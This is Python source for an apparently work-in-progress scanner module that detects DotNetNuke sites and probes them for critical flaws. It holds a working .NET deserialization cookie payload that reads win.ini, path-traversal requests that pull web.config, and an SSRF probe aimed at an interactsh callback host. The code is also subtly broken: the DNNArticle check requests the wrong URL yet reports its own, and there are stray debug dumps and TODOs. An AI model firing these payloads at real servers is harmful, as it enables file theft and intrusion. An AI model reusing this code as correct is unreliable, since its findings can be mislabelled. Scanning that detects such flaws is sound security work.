from bbot.modules.base import BaseModule
from bbot.core.errors import InteractshError


class dotnetnuke(BaseModule):
    DNN_signatures_body = [
        "<!-- by DotNetNuke Corporation",
        "<!-- DNN Platform",
        "/js/dnncore.js?cdv",
        'content=",DotNetNuke,DNN',
        "dnn_ContentPane",
        'class="DnnModule"',
    ]
    DNN_signatures_header = ["DNNOutputCache", "X-Compressed-By: DotNetNuke"]
    exploit_probe = {
        "DNNPersonalization": r'<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'
    }

    watched_events = ["HTTP_RESPONSE"]
    produced_events = ["VULNERABILITY", "FINDING"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {"description": "Scan for critical DotNetNuke (DNN) vulnerabilities"}





    def interactsh_callback(self, r):
            
        self.critical("INTERACTSH_CALLBACK")

        # self.emit_event(
        #     {
        #         "severity": matched_severity,
        #         "host": str(matched_event.host),
        #         "url": matched_event.data,
        #         "description": f"Out-of-band interaction: [{matched_technique}] [{r.get('protocol').upper()}] Read Response: {matched_read_response}",
        #     },
        #     "VULNERABILITY",
        #     matched_event,
        # )


    async def handle_event(self, event):
        detected = False
        raw_headers = event.data.get("raw_header", None)

        if raw_headers:
            for header_signature in self.DNN_signatures_header:
                if header_signature in raw_headers:
                    self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                    )
                    detected = True
                    break
        resp_body = event.data.get("body", None)
        if resp_body:
            for body_signature in self.DNN_signatures_body:
                if body_signature in resp_body:
                    self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                    )
                    detected = True
                    break

        if detected == True:
            # DNNPersonalization Deserialization Detection
            for probe_url in [f'{event.data["url"]}/__', f'{event.data["url"]}/', f'{event.data["url"]}']:
                result = await self.helpers.request(probe_url, cookies=self.exploit_probe)
                if result:
                    if "for 16-bit app support" in result.text and "[extensions]" in result.text:
                        self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke Personalization Cookie Deserialization",
                                "host": str(event.host),
                                "url": probe_url,
                            },
                            "VULNERABILITY",
                            event,
                        )
                        return


            if "endpoint" not in event.tags:
    
                # NewsArticlesSlider ImageHandler.ashx File Read
                result = await self.helpers.request(f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config', cookies=self.exploit_probe)
                if result:
                    self.hugewarning(result.text)
                    if "<configuration>" in result.text:
                        self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke dnnUI_NewsArticlesSlider Module Arbitrary File Read",
                                "host": str(event.host),
                                "url": f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx',
                            },
                            "VULNERABILITY",
                            event,
                        )
                        return
                # DNNArticle GetCSS.ashx File Read
                result = await self.helpers.request(f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config', cookies=self.exploit_probe)
                if result:
                    self.hugewarning(result.text)
                    if "<configuration>" in result.text:
                        self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke DNNArticle Module GetCSS.ashx Arbitrary File Read",
                                "host": str(event.host),
                                "url": f'{event.data["url"]}/Desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config',
                            },
                            "VULNERABILITY",
                            event,
                        )
                        return




                # SSRF /DnnImageHandler.ashx

               # TODO:
                # FIGURE OUT HOW TO MAKE INTERACTSH WORK
                # ADD LAST DETECTION

                subdomain_tag = self.parent_module.helpers.rand_string(4, digits=False)

                if self.scan.config.get("interactsh_disable", False) == False:
                    try:
                        interactsh_instance = self.helpers.interactsh()
                        interactsh_domain = await interactsh_instance.register(callback=self.interactsh_callback)
                    except InteractshError as e:
                        self.warning(f"Interactsh failure: {e}")
                        return False

                    await self.helpers.request(f'{event.data["url"]}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{interactsh_domain}')

                    try:
                        await interactsh_instance.deregister()
                        self.debug(
                            f"successfully deregistered interactsh session with correlation_id {interactsh_instance.correlation_id}"
                        )
                    except InteractshError as e:
                        self.warning(f"Interactsh failure: {e}")

                else:
                    self.debug(
                        "Aborting DNNImageHandler SSRF check due to interactsh global disable"
                    )
                    return None






           #      /Install/InstallWizard.aspx?__VIEWSTATE